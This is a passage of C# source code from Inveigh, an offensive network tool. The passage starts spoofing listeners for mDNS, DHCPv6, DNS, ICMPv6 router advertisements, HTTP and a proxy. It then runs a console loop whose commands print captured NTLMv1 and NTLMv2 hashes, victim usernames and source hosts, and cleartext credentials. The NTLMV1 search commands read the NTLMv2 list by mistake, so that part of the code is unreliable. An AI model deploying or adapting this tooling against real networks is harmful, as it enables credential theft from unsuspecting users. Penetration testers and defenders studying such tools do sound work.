                if (enabledMDNS)
                {
                    Thread mdnsListenerThread = new Thread(() => MDNS.MDNSListener("IPv4", argIP));
                    mdnsListenerThread.Start();
                }

                if (enabledMDNSv6)
                {
                    Thread mdnsListenerThread = new Thread(() => MDNS.MDNSListener("IPv6", argIPv6));
                    mdnsListenerThread.Start();
                }

                if (enabledDHCPv6)
                {
                    Thread dnsListenerThread = new Thread(() => DHCPv6.DHCPv6Listener(argIPv6));
                    dnsListenerThread.Start();
                }

                if (enabledDNS)
                {
                    Thread dnsListenerThread = new Thread(() => DNS.DNSListener("IPv4", argIP));
                    dnsListenerThread.Start();

                    if(!String.IsNullOrEmpty(argIPv6))
                    {
                        Thread dnsListenerIPv6Thread = new Thread(() => DNS.DNSListener("IPv6", argIPv6));
                        dnsListenerIPv6Thread.Start();
                    }
                    
                }

                if ((!enabledWindows || enabledElevated) && !enabledInspect && !String.IsNullOrEmpty(argIPv6) && enabledICMPv6)
                {
                    Thread icmpv6Thread = new Thread(() => ICMPv6.icmpv6RouterAdvertise());
                    icmpv6Thread.Start();
                }

            }

            if (enabledHTTP)
            {

                foreach (string port in argHTTPPorts)
                {
                    Thread httpListenerThread = new Thread(() => HTTP.HTTPListener("HTTP", "IPv4", argHTTPIP, port));
                    httpListenerThread.Start();
                }

                foreach (string port in argHTTPPorts)
                {
                    Thread httpListenerIPv6Thread = new Thread(() => HTTP.HTTPListener("HTTPv6", "IPv6", argHTTPIP, port));
                    httpListenerIPv6Thread.Start();
                }

            }

            if (enabledProxy)
            {
                Thread proxyListenerThread = new Thread(() => HTTP.HTTPListener("Proxy", "IPv4", argProxyIP, argProxyPort));
                proxyListenerThread.Start();
            }

            Thread controlThread = new Thread(() => Control.ControlLoop(argConsole, consoleQueueLimit, consoleStatus, runCount, runTime));
            controlThread.Start();

            if (enabledFileOutput)
            {
                Thread fileOutputThread = new Thread(() => Control.FileOutput(argFileOutputDirectory, argFilePrefix));
                fileOutputThread.Start();
            }

            while (true)
            {

                try
                {
                    Control.OutputLoop();
                    Console.WriteLine();
                    consoleOutput = false;
                    int x = Console.CursorLeft;
                    int y = Console.CursorTop;
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                    Console.WriteLine("Type ? for console command list");
                    Console.Write("Inveigh>");
                    string inputCommand = Console.ReadLine();
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 2;
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.CursorTop = Console.WindowTop + Console.WindowHeight - 3;
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(x, y);
                    inputCommand = inputCommand.ToUpper();

                    switch (inputCommand)
                    {

                        case "GET CONSOLE":
                            Console.Clear();
                            {

                                while (consoleList.Count > 0)
                                {
                                    Control.ConsoleOutputFormat(consoleList[0]);
                                    consoleList.RemoveAt(0);
                                }

                            }
                            break;

                        case "GET LOG":
                            Console.Clear();
                            string[] outputLog = logList.ToArray();

                            foreach (string entry in outputLog)
                            {
                                Control.ConsoleOutputFormat(entry);
                            }
                            break;

                        case "GET CLEARTEXT":
                            Console.Clear();
                            string[] outputCleartext = cleartextList.ToArray();
                            foreach (string entry in outputCleartext)
                                Console.WriteLine(entry);
                            break;

                        case "GET CLEARTEXTUNIQUE":
                            Console.Clear();
                            Util.GetCleartextUnique();
                            break;

                        case "GET DHCPV6":
                            Console.Clear();
                            string[] outputHost = hostList.ToArray();
                            foreach (string entry in outputHost)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV1":
                            Console.Clear();
                            string[] outputNTLMV1 = ntlmv1List.ToArray();
                            foreach (string entry in outputNTLMV1)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV1UNIQUE":
                            Console.Clear();
                            Util.GetNTLMv1Unique();
                            break;

                        case "GET NTLMV1USERNAMES":
                            Console.Clear();
                            Util.GetNTLMv1Usernames();
                            break;

                        case "GET NTLMV2":
                            Console.Clear();
                            string[] outputNTLMV2 = ntlmv2List.ToArray();
                            foreach (string entry in outputNTLMV2)
                                Console.WriteLine(entry);
                            break;

                        case "GET NTLMV2UNIQUE":
                            Console.Clear();
                            Util.GetNTLMv2Unique();
                            break;

                        case "GET NTLMV2USERNAMES":
                            Console.Clear();
                            Util.GetNTLMv2Usernames();
                            break;

                        case "?":
                        case "HELP":
                            Console.Clear();
                            Console.WriteLine();
                            Console.WriteLine("==============================================================================================================");
                            Console.WriteLine(" Inveigh Console Commands");
                            Console.WriteLine("==============================================================================================================\n");
                            Console.WriteLine("  GET CONSOLE                   | get queued console output");
                            Console.WriteLine("  GET DHCPv6                    | get DHCPv6 assigned IPv6 addresses");
                            Console.WriteLine("  GET LOG                       | get log entries; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1                    | get captured NTLMv1 hashes; add search string to filter results");
                            Console.WriteLine("  GET NTLMV2                    | get captured NTLMv2 hashes; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1UNIQUE              | get one captured NTLMv1 hash per user; add search string to filter results");
                            Console.WriteLine("  GET NTLMV2UNIQUE              | get one captured NTLMv2 hash per user; add search string to filter results");
                            Console.WriteLine("  GET NTLMV1USERNAMES           | get usernames and source IPs/hostnames for captured NTLMv1 challenge/response hashes");
                            Console.WriteLine("  GET NTLMV2USERNAMES           | get usernames and source IPs/hostnames for captured NTLMv2 challenge/response hashes");
                            Console.WriteLine("  GET CLEARTEXT                 | get captured cleartext credentials");
                            Console.WriteLine("  GET CLEARTEXTUNIQUE           | get unique captured cleartext credentials");
                            Console.WriteLine("  RESUME                        | resume real time console output");
                            Console.WriteLine("  STOP                          | stop Inveigh\n");
                            Console.WriteLine("==============================================================================================================");
                            break;

                        case "RESUME":
                            consoleOutput = true;
                            break;

                        case "STOP":
                            exitInveigh = true;
                            Control.StopInveigh();
                            break;

                        default:
                            if (inputCommand.StartsWith("GET "))
                            {
                                string[] inputArray = inputCommand.Split(' ');

                                if (!Util.ArrayIsNullOrEmpty(inputArray) && inputArray.Length == 3)
                                {

                                    switch (inputArray[1])
                                    {

                                        case "LOG":
                                            Console.Clear();
                                            var outputLogSearch = logList.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputLogSearch.Count > 0)
                                            {

                                                foreach (string entry in outputLogSearch)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV1":
                                            Console.Clear();
                                            var outputNTLMV1Search = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV1Search.Count > 0)
                                            {

                                                foreach (string entry in outputNTLMV1Search)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV1UNIQUE":
                                            Console.Clear();
                                            var outputNTLMV1UniqueSearch = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV1UniqueSearch.Count > 0)
                                            {
                                                Console.WriteLine(outputNTLMV1UniqueSearch[0]);
                                                Console.WriteLine("{0} matches", outputNTLMV1UniqueSearch.Count);
                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV2":
                                            Console.Clear();
                                            var outputNTLMV2Search = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV2Search.Count > 0)
                                            {

                                                foreach (string entry in outputNTLMV2Search)
                                                {
                                                    Console.WriteLine(entry);
                                                }

                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        case "NTLMV2UNIQUE":
                                            Console.Clear();
                                            var outputNTLMV2UniqueSearch = ntlmv2List.Where(element => CultureInfo.CurrentCulture.CompareInfo.IndexOf(element, inputArray[2], CompareOptions.IgnoreCase) >= 0).ToList();

                                            if (outputNTLMV2UniqueSearch.Count > 0)
                                            {
                                                Console.WriteLine(outputNTLMV2UniqueSearch[0]);
                                                Console.WriteLine("{0} matches", outputNTLMV2UniqueSearch.Count);
                                            }
                                            else
                                            {
                                                Console.WriteLine("no results");
                                            }

                                            break;

                                        default:
                                            Console.WriteLine("Invalid Command");
                                            break;

                                    }

                                }
                                else
                                {
                                    Console.WriteLine("Invalid Command");
                                }

                            }
                            else
                                Console.WriteLine("Invalid Command");
                            break;
                    }

                    Thread.Sleep(5);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(outputList.Count);
                    Program.outputList.Add(String.Format("[-] [{0}] Console error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));                 
                }

            }

        }

    }

}